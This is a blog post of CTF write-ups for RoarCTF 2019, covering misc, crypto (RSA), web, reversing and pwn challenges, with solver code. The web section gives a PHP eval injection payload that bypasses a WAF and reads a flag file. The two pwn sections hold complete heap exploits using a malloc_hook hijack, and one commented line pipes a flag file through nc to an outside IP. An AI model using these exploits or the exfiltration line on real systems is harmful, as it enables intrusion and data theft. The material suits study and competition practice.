---
layout: post
title:  "RoarCTF2019-Writeup"
date:   2019-10-13
desc: ""
keywords: ""
categories: [Ctf]
tags: [CTF]
icon: icon-html
---

# RoarCTF2019-Writeup

* ### 黄金六年

  视频，16进制查看，最后有一段base64，解码得到一个加密压缩包

  逐帧看视频，可以找到二维码，扫码得到压缩包密码，解压得到flag

  

* ### 坦克

  win函数中text加上地图状态转化的字符串，计算sha1与预设值相同出flag
  
  地图状态
  
  0鸟 1砖 2石头 3敌人 4水 5草 6边界 8空地 9被打爆的鸟
  
  进入win函数需要nDestroyNum为4或5，摧毁砖块或鸟nDestroyNum+1
  
  爆破，遍历摧毁 4墙/1鸟3墙/5墙/1鸟4墙 的情况
  
* ### calc

  ```php
  <?php 
  error_reporting(0); 
  if(!isset($_GET['num'])){ 
      show_source(__FILE__); 
  }else{ 
          $str = $_GET['num']; 
          $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]','\$','\\','\^']; 
          foreach ($blacklist as $blackitem) { 
                  if (preg_match('/' . $blackitem . '/m', $str)) { 
                          die("what are you want to do?"); 
                  } 
          } 
          eval('echo '.$str.';'); 
  } 
  ?> 
  ```

  传入字母出Forbidden，num前加空格绕waf

  ```
calc.php?%20num=ls;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))
  ```
  
* ### RSA

  ```python
  A=(((y%x)**5)%(x%y))**2019+y**316+(y+1)/x
  p=next_prime(z*x*y)
  q=next_prime(z)
  A =  2683349182678714524247469512793476009861014781004924905484127480308161377768192868061561886577048646432382128960881487463427414176114486885830693959404989743229103516924432512724195654425703453612710310587164417035878308390676612592848750287387318129424195208623440294647817367740878211949147526287091298307480502897462279102572556822231669438279317474828479089719046386411971105448723910594710418093977044179949800373224354729179833393219827789389078869290217569511230868967647963089430594258815146362187250855166897553056073744582946148472068334167445499314471518357535261186318756327890016183228412253724
  n =  117930806043507374325982291823027285148807239117987369609583515353889814856088099671454394340816761242974462268435911765045576377767711593100416932019831889059333166946263184861287975722954992219766493089630810876984781113645362450398009234556085330943125568377741065242183073882558834603430862598066786475299918395341014877416901185392905676043795425126968745185649565106322336954427505104906770493155723995382318346714944184577894150229037758434597242564815299174950147754426950251419204917376517360505024549691723683358170823416757973059354784142601436519500811159036795034676360028928301979780528294114933347127
  c =  74787643571083387506782798647837190437986187566898207407975212027458147382367711911812375920005113364563084944058626573362415213340732334924596203811015603705197933527220233310567791143957629113041617160438948759036070430128878642065994878749552245283871744136598679680859474057272762874695824234852628699143847120107269353386206556949252718131920398948350334287735566486652091980351487364013798894021457252316205146843330237859028943572169115310051317165142070538562385275320469575470921449008326973403599105685256458196148281329435888565346721147567733142575617385258467453890746333147258890252953170152479246628
  ```

  根据A求x，y

  $2^{2019}>A$ ，所以(((y%x)**5)%(x%y))=1

  A减去一个数可开316次方，x，y不大，爆破得到这个数，然后计算x，y

  ```python
  for i in range(0xfffff):
  	if i % 100000 == 0:
  		print(i)
  	if gmpy2.iroot(A-i,316)[1]==True:
  		print(i)
  		print(gmpy2.iroot(A-i,316)[0])
  		break
  
  i = 43
  y = 83
  x = 2
  ```

  然后求z

  sympy中的nextprime实现

  ```python
  def nextprime(n, ith=1):
      """ Return the ith prime greater than n.
          i must be an integer.
          Notes
          =====
          Potential primes are located at 6*j +/- 1. This
          property is used during searching.
          >>> from sympy import nextprime
          >>> [(i, nextprime(i)) for i in range(10, 15)]
          [(10, 11), (11, 13), (12, 13), (13, 17), (14, 17)]
          >>> nextprime(2, ith=2) # the 2nd prime after 2
          5
          See Also
          ========
          prevprime : Return the largest prime smaller than n
          primerange : Generate all primes in a given range
      """
      n = int(n)
      i = as_int(ith)
      if i > 1:
          pr = n
          j = 1
          while 1:
              pr = nextprime(pr)
              j += 1
              if j > i:
                  break
          return pr
  
      if n < 2:
          return 2
      if n < 7:
          return {2: 3, 3: 5, 4: 5, 5: 7, 6: 7}[n]
      if n <= sieve._list[-2]:
          l, u = sieve.search(n)
          if l == u:
              return sieve[u + 1]
          else:
              return sieve[u]
      nn = 6*(n//6)
      if nn == n:
          n += 1
          if isprime(n):
              return n
          n += 4
      elif n - nn == 5:
          n += 2
          if isprime(n):
              return n
          n += 4
      else:
          n = nn + 5
      while 1:
          if isprime(n):
              return n
          n += 2
          if isprime(n):
              return n
          n += 4
  ```

  根据next_prime(z)-z<10000

  所以

  $p<10000+166z$

  $q<10000+z$

  设$p=a+166z,q=b+z$

  $p*q=(a+166z)(b+z)=n$

  爆破a,b，有整数解时可解出z

  ```python
  for a in range(0,10000):
  	if a % 1000 == 0:
  		print(a)
  	for b in range(0,10000):
  		fuck = (166*b+a)**2 - 4*166*(a*b-n)
  		if gmpy2.iroot(fuck,2)[1]==True:
  			x = gmpy2.iroot(fuck,2)[0]-(166*b+a)
  			print(gmpy2.gcd(x,166))
  			if x%(166*2) == 0:
  				print(gmpy2.iroot(fuck,2))
  				print(a,b)
  				print(x/(166*2))
  ```

  根据z求pq，解c

  没给出e，盲猜65537

  ```python
  p=nextprime((z)*x*y)
  q=nextprime((z))
  if p*q==n:
  	print(p)
  	print(q)
  
  p = 139916095583110895133596833227506693679306709873174024876891023355860781981175916446323044732913066880786918629089023499311703408489151181886568535621008644997971982182426706592551291084007983387911006261442519635405457077292515085160744169867410973960652081452455371451222265819051559818441257438021073941183
  q = 842868045681390934539739959201847552284980179958879667933078453950968566151662147267006293571765463137270594151138695778986165111380428806545593588078365331313084230014618714412959584843421586674162688321942889369912392031882620994944241987153078156389470370195514285850736541078623854327959382156753458569
  c =  74787643571083387506782798647837190437986187566898207407975212027458147382367711911812375920005113364563084944058626573362415213340732334924596203811015603705197933527220233310567791143957629113041617160438948759036070430128878642065994878749552245283871744136598679680859474057272762874695824234852628699143847120107269353386206556949252718131920398948350334287735566486652091980351487364013798894021457252316205146843330237859028943572169115310051317165142070538562385275320469575470921449008326973403599105685256458196148281329435888565346721147567733142575617385258467453890746333147258890252953170152479246628
  print(p*q==n)
  phin = (p-1)*(q-1)
  
  e=65537
  d = gmpy2.invert(e,phin)
  m = pow(c,d,n)
  p = hex(m)[2:].strip('L')
  if len(p)%2 == 1:
  	p = '0'+p
  if 'CTF' in p.decode('hex'):
  	print(p.decode('hex'))
  ```

* ### babyrsa

  ```python
  import sympy
  import random
  
  def myGetPrime():
      A= getPrime(513)
      print(A)
      B=A-random.randint(1e3,1e5)
      print(B)
      return sympy.nextPrime((B!)%A)
  p=myGetPrime()
  A1=21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467234407
  B1=21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467140596
  
  q=myGetPrime()
  A2=16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858418927
  B2=16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858351026
  
  r=myGetPrime()
  
  n=p*q*r
  #n=85492663786275292159831603391083876175149354309327673008716627650718160585639723100793347534649628330416631255660901307533909900431413447524262332232659153047067908693481947121069070451562822417357656432171870951184673132554213690123308042697361969986360375060954702920656364144154145812838558365334172935931441424096270206140691814662318562696925767991937369782627908408239087358033165410020690152067715711112732252038588432896758405898709010342467882264362733
  c=pow(flag,e,n)
  #e=0x1001
  #c=65669738259956193152137899174049847462495016858239424115871354058526815000923451927138381917740393091388382103048930294669378204005488753858176168508082409402675645254753472158733328702151755559380642016251437844181309301474393977753462490799014770286934148130639135186607801014969040037522071972282801884880089523319028620671520971103365275848613335949197149661408042560524107114105126919377503270365243217821644517712076054602321987781198396807717434025338864
  #so,what is the flag?
  ```

  关键点(B!)%A，A,B白给，求出(B!)%A就完事了

  快速阶乘取模，sympy真香

  ```python
  from sympy import *
  import gmpy2
  
  A1=21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467234407
  B1=21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467140596
  A2=16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858418927
  B2=16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858351026
  n=85492663786275292159831603391083876175149354309327673008716627650718160585639723100793347534649628330416631255660901307533909900431413447524262332232659153047067908693481947121069070451562822417357656432171870951184673132554213690123308042697361969986360375060954702920656364144154145812838558365334172935931441424096270206140691814662318562696925767991937369782627908408239087358033165410020690152067715711112732252038588432896758405898709010342467882264362733
  
  e=0x1001
  c=65669738259956193152137899174049847462495016858239424115871354058526815000923451927138381917740393091388382103048930294669378204005488753858176168508082409402675645254753472158733328702151755559380642016251437844181309301474393977753462490799014770286934148130639135186607801014969040037522071972282801884880089523319028620671520971103365275848613335949197149661408042560524107114105126919377503270365243217821644517712076054602321987781198396807717434025338864
  
  fuck1 = Mod(factorial(B1, evaluate=False),A1)
  fuck2 = Mod(factorial(B2, evaluate=False),A2)
  #print(fuck1)
  #print(fuck2)
  p = nextprime(fuck1)
  q = nextprime(fuck2)
  print(p)
  print(q)
  r = n/p/q
  
  phin = (p-1)*(q-1)*(r-1)
  d = gmpy2.invert(e,phin)
  m = pow(c,d,n)
  p = hex(m)[2:].strip('L')
  if len(p)%2 != 0:
  	p = '0' + p
  #print(p)
  print(p.decode('hex'))
  ```

  

* ### easy_pwn

  ubuntu 16

  edit时输入的size比create的size大10时可以多输入一个字节，off-by-one

  malloc(0x68) 0,1,2,3,4,5,6

  edit(1)，覆盖2的size，使2的size为2、3size和

  free(2) 进unsorted bin，fd、bk为main_arena+88

      pwndbg> x/64gx 0x7fffc806e070
      0x7fffc806e070: 0x0000000000000000      0x0000000000000071
      0x7fffc806e080: 0x6161616161616161      0x6161616161616161
      0x7fffc806e090: 0x6161616161616161      0x6161616161616161
      0x7fffc806e0a0: 0x6161616161616161      0x6161616161616161
      0x7fffc806e0b0: 0x6161616161616161      0x6161616161616161
      0x7fffc806e0c0: 0x6161616161616161      0x6161616161616161
      0x7fffc806e0d0: 0x6161616161616161      0x6161616161616161
      0x7fffc806e0e0: 0x0000000000000000      0x00000000000000e1
      0x7fffc806e0f0: 0x00007ffb99bf4b78      0x00007ffb99bf4b78
      0x7fffc806e100: 0x0000000000000000      0x0000000000000000
      0x7fffc806e110: 0x0000000000000000      0x0000000000000000
      0x7fffc806e120: 0x0000000000000000      0x0000000000000000
      0x7fffc806e130: 0x0000000000000000      0x0000000000000000
      0x7fffc806e140: 0x0000000000000000      0x0000000000000000
      0x7fffc806e150: 0x0000000000000000      0x0000000000000071
      0x7fffc806e160: 0x0000000000000000      0x0000000000000000
      0x7fffc806e170: 0x0000000000000000      0x0000000000000000
      0x7fffc806e180: 0x0000000000000000      0x0000000000000000
      0x7fffc806e190: 0x0000000000000000      0x0000000000000000
      0x7fffc806e1a0: 0x0000000000000000      0x0000000000000000
      0x7fffc806e1b0: 0x0000000000000000      0x0000000000000000

  malloc(0x68) 切割unsorted，main_arena+88进3

  show(3)，泄露main_arena+88

      pwndbg> x/64gx 0x7fffc5391070
      0x7fffc5391070: 0x0000000000000000      0x0000000000000071
      0x7fffc5391080: 0x6161616161616161      0x6161616161616161
      0x7fffc5391090: 0x6161616161616161      0x6161616161616161
      0x7fffc53910a0: 0x6161616161616161      0x6161616161616161
      0x7fffc53910b0: 0x6161616161616161      0x6161616161616161
      0x7fffc53910c0: 0x6161616161616161      0x6161616161616161
      0x7fffc53910d0: 0x6161616161616161      0x6161616161616161
      0x7fffc53910e0: 0x0000000000000000      0x0000000000000071
      0x7fffc53910f0: 0x0000000000000000      0x0000000000000000
      0x7fffc5391100: 0x0000000000000000      0x0000000000000000
      0x7fffc5391110: 0x0000000000000000      0x0000000000000000
      0x7fffc5391120: 0x0000000000000000      0x0000000000000000
      0x7fffc5391130: 0x0000000000000000      0x0000000000000000
      0x7fffc5391140: 0x0000000000000000      0x0000000000000000
      0x7fffc5391150: 0x0000000000000000      0x0000000000000071
      0x7fffc5391160: 0x00007f58f5bf4b78      0x00007f58f5bf4b78
      0x7fffc5391170: 0x0000000000000000      0x0000000000000000
      0x7fffc5391180: 0x0000000000000000      0x0000000000000000
      0x7fffc5391190: 0x0000000000000000      0x0000000000000000
      0x7fffc53911a0: 0x0000000000000000      0x0000000000000000
      0x7fffc53911b0: 0x0000000000000000      0x0000000000000000

  edit(4)，覆盖5的size，使5的size为5、6size和

  free(5)

  malloc(0xd0)，edit(5)，把6的size改回来，free(6)

      pwndbg> x/64gx 0x7fffcf5a3230
      0x7fffcf5a3230: 0x0000000000000000      0x00000000000000e1
      0x7fffcf5a3240: 0x0505050505050505      0x0505050505050505
      0x7fffcf5a3250: 0x0505050505050505      0x0505050505050505
      0x7fffcf5a3260: 0x0505050505050505      0x0505050505050505
      0x7fffcf5a3270: 0x0505050505050505      0x0505050505050505
      0x7fffcf5a3280: 0x0505050505050505      0x0505050505050505
      0x7fffcf5a3290: 0x0505050505050505      0x0505050505050505
      0x7fffcf5a32a0: 0x0505050505050505      0x0000000000000070
      0x7fffcf5a32b0: 0x0000000000000000      0x0606060606060606
      0x7fffcf5a32c0: 0x0606060606060606      0x0606060606060606
      0x7fffcf5a32d0: 0x0606060606060606      0x0606060606060606
      0x7fffcf5a32e0: 0x0606060606060606      0x0606060606060606
      0x7fffcf5a32f0: 0x0606060606060606      0x0606060606060606
      0x7fffcf5a3300: 0x0606060606060606      0x0606060606060606
      0x7fffcf5a3310: 0x0000000000000000      0x0000000000020cf1

  现在可以通过edit(5)控制6的fd，进行fastbin attack

  直接把one_gadget写入malloc_hook不可用，需要利用realloc_hook调整

  把one_gadget写入realloc_hook，把realloc写入malloc_hook

  执行realloc调整，然后跳到realloc_hook，执行one_gadget

  ```python
  from pwn import *
  r = process('./easy_pwn')
  #r = remote('node3.buuoj.cn', 28951)
  elf = ELF('./easy_pwn')
  libc = ELF('libc-2.23.so')
  
  def create(size):
      r.sendlineafter('choice: ','1')
      r.sendlineafter('size: ',str(size))
  
  def edit(index,size,content):
      r.sendlineafter('choice: ','2')
      r.sendlineafter('index: ',str(index))
      r.sendlineafter('size: ',str(size))
      r.sendlineafter('content: ',content)
  
  def free(index):
      r.sendlineafter('choice: ','3')
      r.sendlineafter('index: ',str(index))
  
  def show(index):
      r.sendlineafter('choice: ','4')
      r.sendlineafter('index: ',str(index))
      
  create(0x68)#0
  create(0x68)#1
  create(0x68)#2
  create(0x68)#3
  create(0x68)#4
  create(0x68)#5
  create(0x68)#6
  
  edit(1,0x68+10,'a'*0x60+p64(0)+'\xe1')
  free(2)
  create(0x68)#2
  
  show(3)
  r.recvuntil('content: ')
  fuck = u64(r.recv(6).ljust(8,'\x00'))
  main_arena = fuck - 88
  libc_base = main_arena - 0x3c4b20
  one = libc_base+0x4526a
  realloc = libc_base+libc.symbols['realloc']
  fuck_addr = main_arena-0x33
  malloc_hook = main_arena-0x10
  realloc_hook = main_arena-0x18
  log.success('main_arena:'+hex(main_arena))
  log.success('libc_base:'+hex(libc_base))
  log.success('one:'+hex(one))
  log.success('realloc:'+hex(realloc))
  log.success('fuck_addr:'+hex(fuck_addr))
  log.success('malloc_hook:'+hex(malloc_hook))
  log.success('realloc_hook:'+hex(realloc_hook))
  
  edit(4,0x68+10,'\x00'*0x60+p64(0)+'\xe1')
  free(5)
  
  create(0xd0)#5
  edit(5,0xd0,'\x05'*0x68+p64(0x70)+'\x06'*0x60)
  free(6)
  edit(5,0xd0,'\x00'*0x68+p64(0x70)+p64(fuck_addr)+'\x00'*0x58)
  
  create(0x68)#6
  create(0x68)#7
  
  edit(7,0x68,'\x00'*0xb+p64(one)+p64(realloc)+'\x00'*0x4d)
  create(0x68)
  r.interactive()
  ```





* ### easy_heap

  UAF

  show被限制，需要使0x602090为0xdeadbeefdeadbeef

  申请大量fastbin chunk然后free，scanf触发malloc_conslidate合并构造unsorted bin

  ![2](https://raw.githubusercontent.com/AiDaiP/images/master/roar/2.jpg)

  ![1](https://raw.githubusercontent.com/AiDaiP/images/master/roar/1.jpg)

  开局username 和 password 构造house of spirit

  利用666的calloc(0xa0)构造unlink，使666的ptr指向0x602080

  ![4](https://raw.githubusercontent.com/AiDaiP/images/master/roar/4.jpg)

  然后free，下一次add申请到这里可以修改0x602090开show，泄露libc

  ![5](https://raw.githubusercontent.com/AiDaiP/images/master/roar/5.jpg)

  show之后标准输出和标准错误关闭

  拿回fastbin，fastbin attack打malloc_hook

  ![3](https://raw.githubusercontent.com/AiDaiP/images/master/roar/3.jpg)

  

  最后利用free触发异常，调用malloc_hook

  没有标准输出，不能直接cat flag

  ```python
  from pwn import *
  #r = remote('39.108.76.129',2333)
  r = process('./roarctf_2019_easyheap')
  elf = ELF('./roarctf_2019_easyheap')
  libc =  ELF('./libc-2.23.so')
  
  def add(size,content):
  	r.recvuntil('>>')
  	r.sendline('1')
  	r.recvuntil('size\n')
  	r.sendline(str(size))
  	r.recvuntil('content')
  	r.send(content)
  
  def fuck_add(size,content):
  	r.sendline('1')
  	r.sendline(str(size))
  	r.send(content)
  
  def free():
  	r.recvuntil('>>')
  	r.sendline('2')
  
  def fuck_free():
  	r.sendline('2')
  
  def show():
  	r.recvuntil('>>')
  	r.sendline('3')
  
  def build_666(content):
  	r.recvuntil('>>')
  	r.sendline('666')
  	r.recvuntil('?')
  	r.sendline('1')
  	r.send(content)
  
  def free_666():
  	r.recvuntil('>>')
  	r.sendline('666')
  	r.recvuntil('?')
  	r.sendline('2')
  
  r.recvuntil('username:')
  r.send(p64(0)*3+p64(0x41))
  r.recvuntil('info:')
  r.send(p64(0)*3+p64(0x20e21))
  
  add(0x38,'fuck')
  free()
  add(0x48,'fuck')
  free()
  add(0x28,'fuck')
  free()
  add(0x18,'fuck')
  free()
  add(0x68,p64(0)*7+p64(0x21)+p64(0)*2+p64(0x20)+p64(0x101))
  free()
  
  add(0x80,'fuck')
  add(0x28,'fuck')
  free()
  
  r.recvuntil('>>')
  r.sendline('1'*0x400)
  
  
  
  payload = p64(0)*2+p64(0x602098-0x18)+p64(0x602098-0x10)
  payload = payload.ljust(0x80,'\x00')
  payload += p64(0x80)+p64(0x90)
  
  build_666(payload)
  free()
  free_666()
  
  add(0x38,p64(0)+p64(0x602080)+p64(0xdeadbeefdeadbeef))
  r.interactive()
  free()
  
  add(0x68,'a'*0x10)
  show()
  
  r.recvuntil('a'*0x10)
  leak = r.recvuntil('\n',drop=True)
  libc_base = u64(leak.ljust(0x8,'\x00'))-0x3c4b78
  malloc_hook = libc_base + libc.sym['__malloc_hook']
  one = libc_base + 0xf02a4
  log.success('libc_base:'+hex(libc_base))
  log.success('malloc_hook:'+hex(malloc_hook))
  log.success('one:'+hex(one))
  
  
  fuck_free()
  fuck_add(0x80,'fuck')
  fuck_add(0x18,p64(0)+p64(0x71)+p64(malloc_hook-0x23))
  fuck_add(0x68,'fuck')
  fuck_add(0x68,'\x00'*0x13+p64(one))
  fuck_free()
  fuck_free()
  
  #r.sendline("cat flag | nc 39.108.76.129 2333")
  #r.sendline("ls >&0")
  
  r.interactive()
  ```

* ### polyre

  去平坦化再去掉虚假控制流程

  ```c
  __int64 __fastcall main(__int64 a1, char **a2, char **a3)
  {
    v10 = 0;
    memset(s, 0, 0x30uLL);
    memset(s1, 0, 0x30uLL);
    printf("Input:", 0LL);
    v11 = s;
    __isoc99_scanf("%s", v11);
  
    for ( i = 0; ; ++i )
    {
      v18 = i;
      v20 = s;
      v4 = *&v20[8 * i];
      v7 = 0;
      while ( 1 )
      {
        v21 = v7;
        if ( v21 >= 64 )
          break;
        v23 = v4;
        v24 = v4 < 0;
        if ( v4 >= 0 )
        {
          v27 = v4;
          v28 = 2 * v27;
          v4 = v28;
        }
        else
        {
          v25 = 2 * v4;
          v26 = v25;
          v4 = v26 ^ 0xB0004B7679FA26B3LL;
        }
        v29 = v7;
        v7 = v29 + 1;
      }
      v30 = 8 * i;
      v31 = &s1[8 * i];
      *v31 = v4;
  
      v32 = i + 1;
    }
    v33 = memcmp(s1, &unk_402170, 0x30uLL);
    v34 = v33 != 0;
    if ( v34 )
      puts("Wrong!");
    else
      puts("Correct!");
    return v10;
  }
  ```

  输入长度48的字符串，每8字节一组，对每组取第一个字节判断正负，正左移一位，负右移一位，再异或0xB0004B7679FA26B3，重复64次，与unk_402170比较

  ```python
  fuck = [0xBC8FF26D43536296, 0x520100780530EE16, 0x4DC0B5EA935F08EC, 0x342B90AFD853F450, 0x8B250EBCAA2C3681, 0x55759F81A2C68AE4]
  flag = ''
  for s in fuck:
      for i in range(64):
          nmsl = s & 1
          if nmsl == 1:
              s ^= 0xB0004B7679FA26B3
          s //= 2
          if nmsl == 1:
              s |= 0x8000000000000000
      print(hex(s))
  
  ```

  